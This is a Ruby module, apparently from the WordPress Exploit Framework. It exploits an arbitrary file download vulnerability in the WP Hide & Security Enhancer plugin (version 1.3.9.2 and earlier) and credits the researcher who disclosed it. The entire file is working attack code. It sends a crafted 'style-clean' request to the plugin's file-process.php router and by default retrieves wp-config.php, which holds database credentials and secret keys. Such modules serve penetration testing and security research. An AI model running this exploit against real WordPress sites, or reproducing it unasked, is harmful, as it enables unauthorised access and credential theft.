# frozen_string_literal: true

class Wpxf::Auxiliary::WpHideSecurityEnhancerFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'WP Hide & Security Enhancer <= 1.3.9.2 File Download',
      author: [
        'Julio Potier', # Disclosure
        'rastating'     # WPXF module
      ],
      references: [
        ['WPVDB', '8867'],
        ['URL', 'https://secupress.me/blog/arbitrary-file-download-vulnerability-in-wp-hide-security-enhancer-1-3-9-2/']
      ],
      date: 'Jul 21 2017'
    )
  end

  def check
    check_plugin_version_from_readme('wp-hide-security-enhancer', '1.3.9.3')
  end

  def default_remote_file_path
    'wp-config.php'
  end

  def working_directory
    'the WordPress installation directory'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'wp-hide-security-enhancer', 'router', 'file-process.php')
  end

  def download_request_params
    {
      'action' => 'style-clean',
      'file_path' => "/#{remote_file}"
    }
  end

  def validate_content(content)
    if content.empty?
      emit_error 'No content returned, file may not exist.'
      return false
    end

    super
  end
end
